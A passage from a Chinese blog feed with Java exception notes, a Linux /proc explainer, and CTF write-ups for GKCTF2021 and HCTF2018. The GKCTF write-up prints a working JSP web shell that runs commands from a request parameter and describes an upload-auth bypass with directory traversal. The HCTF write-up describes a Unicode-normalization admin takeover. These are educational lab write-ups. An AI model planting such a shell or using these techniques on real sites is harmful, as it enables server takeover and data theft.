punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"匿名代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        测试 cs <span class="token operator">=</span> <span class="token keyword">new</span> 测试<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210717203353142.png" alt="image-20210717203353142"></p><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p><code>abstract</code></p><p><img src="image-20210717204055895.png" alt="image-20210717204055895"></p><p>抽象类的所有方法都要由子类去实现，不能new</p><p>一但有抽象方法，类必须声明为抽象类</p><p><img src="image-20210717211217513.png" alt="image-20210717211217513"></p><ol><li><strong>抽象类中的非抽象方法不用重写，其他必须重写，接口的方法必须重写；</strong></li><li><strong>接口和抽象类中只有方法名，没有定义的，如果你不定义 也就是空方法，接口就是为了弥补java不能多重继承，接口针对的是对象而不是实现。实现的部分可以交由对象去实现。</strong></li></ol><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口 interface"></a>接口 <code>interface</code></h3><p><img src="image-20210717211608190.png" alt="image-20210717211608190"></p><p><strong>实现接口的类规范命名为<code>nameImpl</code></strong></p><p><strong>接口使用<code>implement</code>调用</strong></p><p><img src="image-20210717212749051.png" alt="image-20210717212749051"></p><p><img src="image-20210717212958626.png" alt="image-20210717212958626"></p><p><img src="image-20210717213208124.png" alt="image-20210717213208124"></p><h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h3><ul><li>成员内部类</li><li>静态内部类</li><li>局部内部类</li><li>匿名内部类</li></ul><h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h4><p><img src="image-20210717214102398.png" alt="image-20210717214102398"></p><p>内部类最大的好处就是可以访问外部类的私有方法和属性</p><p><img src="image-20210717214357851.png" alt="image-20210717214357851"></p><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h4><p>静态内部类就是给成员内部类加上静态属性</p><h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h4><p><img src="image-20210717214615745.png" alt="image-20210717214615745"></p><p>写在方法中的类是局部内部类</p><h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h4><p><img src="image-20210717215021828.png" alt="image-20210717215021828"></p><p>实例化时不给实例对象起名，叫匿名内部类</p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p><img src="image-20210718095606659.png" alt="image-20210718095606659"></p><h2 id="异常关键字"><a href="#异常关键字" class="headerlink" title="异常关键字"></a>异常关键字</h2><h3 id="try、catch、finally"><a href="#try、catch、finally" class="headerlink" title="try、catch、finally"></a><code>try、catch、finally</code></h3><ul><li><p>try</p><blockquote><p>监控包裹的代码块，捕获此代码块中出现的异常</p></blockquote></li><li><p>catch</p><blockquote><p>定义捕获的异常类型，设置解决方案</p><p>语句：<code>catch(异常类型 自定义别名)&#123;解决方案&#125;</code></p><p>catch可以设置多个</p></blockquote></li><li><p>finally</p><blockquote><p>对异常的善后工作，即使检测的代码块没有异常，finally还是会被执行</p></blockquote></li></ul><p><strong><code>try,catch,finally</code>都是对异常的检测以及抛出，往往处理无法预料的异常</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 异常 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">yich</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"finally"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String a <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        异常 yc <span class="token operator">=</span> <span class="token keyword">new</span> 异常<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yc<span class="token punctuation">.</span><span class="token function">yich</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210718101946951.png" alt="image-20210718101946951"></p><h3 id="throw-throws"><a href="#throw-throws" class="headerlink" title="throw     throws"></a>throw     throws</h3><p>不同于<code>try、catch、finally</code>是在发生异常时接收，<code>thorw和thorws</code>用于主动抛出异常</p><p>即我们知道<code>10/0</code>是错误的，<code>try</code>会运行，发现是错误才抛出，<code>thorw</code>和<code>throws</code>是我们告诉了程序，程序遇到<code>10/0</code>便会直接抛出异常</p><ul><li><p>throw</p><blockquote><p>用于主动抛出异常</p></blockquote></li><li><p>throws</p><blockquote><p>异常在方法中无法处理，用throws将异常向上抛出，让更高级处理</p></blockquote></li></ul><p>这两个关键字都用在方法中</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 异常 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">thro1</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token keyword">throws</span> ArithmeticException<span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//throws遇到异常抛出指定的异常，但本身不做处理，而是抛出给上一级处理，一般和throw一起使用</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a <span class="token operator">/</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">thro</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ArithmeticException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//throw符合条件直接抛出new的异常</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        异常 yc <span class="token operator">=</span> <span class="token keyword">new</span> 异常<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yc<span class="token punctuation">.</span><span class="token function">thro1</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        yc<span class="token punctuation">.</span><span class="token function">thro</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 异常 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">thro</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ArithmeticException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"异常。。。重试。。。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210718204858832.png" alt="image-20210718204858832"></p><h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 自定义异常 <span class="token keyword">extends</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//继承异常类的子类可作为自定义异常</span>    <span class="token keyword">private</span> <span class="token keyword">int</span>  detail<span class="token punctuation">;</span>    <span class="token keyword">public</span> 自定义异常<span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>detail <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"自定义异常{"</span> <span class="token operator">+</span>                <span class="token string">"detail="</span> <span class="token operator">+</span> detail <span class="token operator">+</span>                <span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> 异常 <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token keyword">throws</span> 自定义异常 <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> 自定义异常<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"a &lt; 10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            异常 yc <span class="token operator">=</span> <span class="token keyword">new</span> 异常<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            yc<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            yc<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210719174320270.png" alt="l"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜鸟随笔-GKCTF2021</title>
      <link href="/2021/06/26/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-GKCTF2021/"/>
      <url>/2021/06/26/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-GKCTF2021/</url>
      
        <content type="html"><![CDATA[<p><strong>上去练了下手，发现自己不会几道题</strong></p><p><strong>又一个拉跨的web手诞生了</strong></p><h1 id="GKCTF2021"><a href="#GKCTF2021" class="headerlink" title="GKCTF2021"></a>GKCTF2021</h1><h1 id="web1-easycms"><a href="#web1-easycms" class="headerlink" title="web1-easycms"></a>web1-easycms</h1><p>web方向的签到题，虽然卡了好几步，但真的简单</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>进入页面，简单找了一下，首页没什么信息</p><p>测试发现后台为admin.php</p><p><img src="image-20210626190255092.png" alt="image-20210626190255092"></p><p>虽然没有验证码，但这道题输入错误三次就会锁住三分钟，无法进行爆破</p><p>靠猜测可知用户名admin,密码12345</p><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>进入后台，在设计位置可以看到一个首页模板，如果可以写入命令或者一句话，我们就可以得到flag</p><p>这个思路是一次awd给我的启发，当然，网上也有文章提到了这个漏洞</p><p>链接：<a href="http://www.yidianzixun.com/article/0J0BhinZ">http://www.yidianzixun.com/article/0J0BhinZ</a></p><p>直接往模板写，提示需要创建cwqe.txt文件</p><p><img src="image-20210626204300084.png" alt="image-20210626204300084"></p><p>找找有没有可以文件上传的地方</p><p>找了一会，发现素材库位置不但可以上传文件，还可以改路径，完美符合要求</p><p><img src="image-20210626204600943.png" alt="image-20210626204600943"></p><p>上传</p><p><img src="image-20210626205208461.png" alt="image-20210626205208461"></p><p>用目录穿越将文件定位到指定的目录</p><p><img src="image-20210626205322771.png" alt="image-20210626205322771"></p><p>保存成功，当然我第一次做这题先后要求了两个目录，用一样的手法上传即可</p><p>回到首页，首页已经乱码，执行我们的一句话即可</p><p><img src="image-20210626205422342.png" alt="image-20210626205422342"></p><p><img src="image-20210626205637732.png" alt="image-20210626205637732"></p><p>拿到flag</p><h1 id="babycat"><a href="#babycat" class="headerlink" title="babycat"></a>babycat</h1><p>这道题，我不会</p><p>这道题是w4师傅告诉了我非预期，所以我复现了一下，聊以练手</p><h2 id="json格式注册登录"><a href="#json格式注册登录" class="headerlink" title="json格式注册登录"></a>json格式注册登录</h2><p>进入网站，一个注册一个登录，而且注册页面一片空白</p><p><img src="image-20210626211235280.png" alt="image-20210626211235280"></p><p>抓包看看什么情况</p><p><img src="image-20210626211402642.png" alt="image-20210626211402642"></p><p>告诉我们上传格式是data=”json格式的数据”，直接构造payload</p><pre class="line-numbers language-payload"><code class="language-payload">data={"username":"test","password":"test"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210626211651217.png" alt="image-20210626211651217"></p><p>注册成功</p><p><img src="image-20210626211812732.png" alt="image-20210626211812732"></p><p>登录进去有四个链接和一只呆猫</p><p>这里主要有两个地方需要注意，一个是upload，一个是Download Test</p><p>upload可以上传文件，Download Test 可以任意文件读取</p><p>但upload必须以管理员身份登录才可以访问，而非预期，绕过了这个限制</p><h2 id="post绕过身份验证上传文件"><a href="#post绕过身份验证上传文件" class="headerlink" title="post绕过身份验证上传文件"></a>post绕过身份验证上传文件</h2><p>任意文件读取就不提了，非预期用不到</p><p>当然这么说也不对，这个非预期，是将源码用任意文件读取dump下来审计后审出来的</p><p>这里就直接说用法，所以不用任意文件读取了，想学习预期解，请认准出题人w4</p><p>这里先使用postman进入到upload，并上传木马文件</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%    if("023".equals(request.getParameter("pwd"))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print("<pre>");        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print("</pre>");    }%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210627091759686.png" alt="image-20210627091759686"></p><p>上传同时抓包</p><p>然后改路径</p><p><img src="image-20210627091822230.png" alt="image-20210627091822230"></p><p>路径随意，可读取即可</p><p><img src="image-20210627092109632.png" alt="image-20210627092109632"></p><p>命令执行成功，怎么拿flag应该不用我多说，读取/readflag即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统之proc目录解析</title>
      <link href="/2021/06/25/Linux%E7%B3%BB%E7%BB%9F%E4%B9%8Bproc%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90/"/>
      <url>/2021/06/25/Linux%E7%B3%BB%E7%BB%9F%E4%B9%8Bproc%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="linux系统之proc目录"><a href="#linux系统之proc目录" class="headerlink" title="linux系统之proc目录"></a>linux系统之proc目录</h1><p><strong>在谈proc目录之前，我觉得有必要提一下一个常见的概念</strong></p><h1 id="id-uid-pid-ppid"><a href="#id-uid-pid-ppid" class="headerlink" title="id , uid , pid , ppid"></a>id , uid , pid , ppid</h1><h2 id="id"><a href="#id" class="headerlink" title="id"></a>id</h2><p>id是最常见的名词，是对所有id的一个统称，这个没什么好谈的</p><h2 id="uid"><a href="#uid" class="headerlink" title="uid"></a>uid</h2><p>uid在linux系统中，表示用户的id，即我们登录的用户，包括root用户，他们的“身份标识”便是uid</p><h2 id="pid"><a href="#pid" class="headerlink" title="pid"></a>pid</h2><p>pid是在proc目录的相关知识中最重要的一个概念，linux系统中用它表示进程的id,每个正在运行的进程都有一个独一无二的pid</p><h2 id="ppid"><a href="#ppid" class="headerlink" title="ppid"></a>ppid</h2><p>ppid在实际中应用很少，定义我直接复制，这里不想多谈</p><p>详情见：<a href="https://zhidao.baidu.com/question/750271241282834652.html">https://zhidao.baidu.com/question/750271241282834652.html</a></p><ul><li>PPID Product Part Identification 产品料号识别码，便于产品追踪，并含有部分信息，一般的使用形式是产品包装上贴的一维码或二维码</li><li>计算机中代表当前进程的父进程ID;Payload protocol identifier,在S1AP通信中标识此服务ID</li></ul><h1 id="用途和功能"><a href="#用途和功能" class="headerlink" title="用途和功能"></a>用途和功能</h1><p>介绍完pid的概念，我们来看看proc目录具体有什么，做什么</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>proc目录是由linux系统提供的一种文件系统，用来在运行时访问内核内部数据结构、改变内核设置的机制</p><p>proc只存在于内容中，而不进入外存</p><p>proc是用于访问、控制linux内核数据的一个接口</p><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>proc主要用于查询linux系统的内核数据：进程信息</p><p>它可以告诉我们每个进程的具体运行情况</p><p>在ctf中，可以用它来读取一些信息</p><h1 id="proc的目录结构"><a href="#proc的目录结构" class="headerlink" title="proc的目录结构"></a>proc的目录结构</h1><p><img src="image-20210625203556795.png" alt="image-20210625203556795"></p><p>如图，图中数字构成的目录便是进程的uid，有多少目录，就表示当前有多少进程在运行</p><h2 id="proc-pid"><a href="#proc-pid" class="headerlink" title="proc/$pid"></a>proc/$pid</h2><p>通过<code>/proc/$pid/</code>来获取指定进程的信息，例如内存映射、CPU绑定信息等等。</p><h2 id="self"><a href="#self" class="headerlink" title="self"></a>self</h2><p>在proc中，想读取到信息，知道进程对应的pid是前提，但一般情况下我们无法得知进程的uid</p><p>self目标便是linux为了方便使用而设置的一个line（链接）目录，它可以让我们简单的查看当前正在运行的进程信息</p><p><img src="image-20210625203808386.png" alt="image-20210625203808386"></p><p>为了容易理解，接下来的部分全部用self来说明</p><h1 id="进程相关的目录于文件详解"><a href="#进程相关的目录于文件详解" class="headerlink" title="进程相关的目录于文件详解"></a>进程相关的目录于文件详解</h1><h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p>cmdline 说明了当前进程具体执行的命令</p><p><img src="image-20210625204241242.png" alt="image-20210625204241242"></p><h2 id="目录-cwd"><a href="#目录-cwd" class="headerlink" title="目录 cwd"></a>目录 cwd</h2><p>cwd目录表示了当前进程所在的具体位置，即路径，是一个指向路径的符号链接</p><p><img src="image-20210625204556261.png" alt="image-20210625204556261"></p><p>这里用1进程容易理解</p><p><img src="image-20210625204642630.png" alt="image-20210625204642630"></p><p>1进程，即根目录进程，cwd</p><p>在当前进程文件夹下ls cwd ，可以达到cd 【指向目录】命令的同样的效果</p><p><img src="image-20210625204844039.png" alt="image-20210625204844039"></p><h2 id="目录-fd"><a href="#目录-fd" class="headerlink" title="目录 fd"></a>目录 fd</h2><p>fd目录包含着<strong>当前进程打开的每一个文件</strong>的描述符，并可以通过描述符查看对应文件的具体内容</p><p><img src="image-20210625205245377.png" alt="image-20210625205245377"></p><p>图中 数字即为描述符，指向是具体打开的文件目录</p><h3 id="查看具体内容"><a href="#查看具体内容" class="headerlink" title="查看具体内容"></a>查看具体内容</h3><pre class="line-numbers language-linux"><code class="language-linux">cat /proc/self/fd/14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210625210025442.png" alt="image-20210625210025442"></p><p>截不全了，就这样吧</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在proc目录下，对目录和文件的查看需使用对应的命令，目录是ls，文件为cat,more,和操作其他目录相同</p><p>如</p><pre class="line-numbers language-linux"><code class="language-linux">ls -l fd/14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210625210201286.png" alt="image-20210625210201286"></p><pre class="line-numbers language-linux"><code class="language-linux">more fd/14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如上图，不重复粘贴了</p><h2 id="目录-exe"><a href="#目录-exe" class="headerlink" title="目录 exe"></a>目录 exe</h2><p>exe目录告诉我们该进程 运行（可执行）文件 的具体路径（完成路径）</p><p><img src="image-20210625210430932.png" alt="image-20210625210430932"></p><p>与cwd不同，cwd专指目标<strong>指定进程环境</strong>的<strong>运行目录</strong></p><p>而exe为<strong>指定进程</strong>的<strong>可执行文件</strong>的<strong>完整路径</strong></p><p>看看对比</p><p><img src="image-20210625210631411.png" alt="image-20210625210631411"></p><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p>environ文件说明了当前进程运行的具体环境，即<strong>环境变量</strong>列表</p><p>变量彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看<strong>environ目录</strong>来获取<strong>指定进程</strong>的<strong>环境变量</strong>信息：</p><pre class="line-numbers language-linux"><code class="language-linux">cat /proc/self/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210625211104917.png" alt="image-20210625211104917"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF2018-admin赛题复现</title>
      <link href="/2021/06/21/HCTF2018-admin%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/06/21/HCTF2018-admin%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>本文参考链接：</p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一道几乎被做烂的题，BUUCTF中达到了3400解</p><p>但我觉得它的审计部分很经典，解多单纯的只是因为非预期</p><p><img src="image-20210622110336407.png" alt="image-20210622110336407"></p><p>刚打开时，我以为这事一道二次注入的问题，结果注了好久都进不去</p><p>直到我在改密处找到了源码的地址</p><p><img src="image-20210622110405786.png" alt="image-20210622110405786"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>dump下源码后，发现他几乎给了我们整个网站</p><p><img src="image-20210622110504155.png" alt="image-20210622110504155"></p><p>以python为基础的代码审计</p><p>能怎么办，看呗，结果看了半个小时只找到几个疑似点</p><p>然后看了wp，我让深深怀疑这种题为什么会有3500解</p><p>wp给出了三种思路</p><h3 id="编码伪造"><a href="#编码伪造" class="headerlink" title="编码伪造"></a>编码伪造</h3><p>这大概是最容易看出，也是最好想到的操作</p><p><img src="image-20210622111115273.png" alt="image-20210622111115273"></p><p>仔细看代码，会发现题目在注册，登录，改密中都对username进行了这个操作</p><p>追踪过去，看看这个函数具体是什么</p><p><img src="image-20210622113613608.png" alt="image-20210622113613608"></p><p>将输入的username交给了nodeprep.prepare函数处理，看看这个函数是什么</p><p>往上看，可以直到此函数在这个库中</p><p><img src="image-20210622114043329.png" alt="image-20210622114043329"></p><p>在这里可以看到版本的信息，这里是10版，而官网已经到了21.2.0，版本差距极大</p><p><img src="image-20210622141214771.png" alt="image-20210622141214771"></p><p>查看一下官方文档的说明，发现该库已经被弃用</p><p><img src="image-20210622142626990.png" alt="image-20210622142626990"></p><p>时间太过久远，源码找不到，也不想下了（需要python2）</p><p>这里直接粘贴参加链接的</p><p><img src="https://img-blog.csdnimg.cn/20190911131601586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>简单说，这里的机制让我们注册，登录，改密时都是以小写的用户名进行，即使我们注册大写</p><p>这个函数的编码过程在大写字母上还存在一层，<code>ᴬᴰᴹᴵᴺ</code>，函数会把它转化为ADMIN</p><p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。<br><img src="image-20210622145320708.png" alt="image-20210622145320708"></p><pre class="line-numbers language-flag"><code class="language-flag">flag{c66a73bf-6a5f-4772-ba1f-00fa5d5e7f20}<span aria-hidden="true" 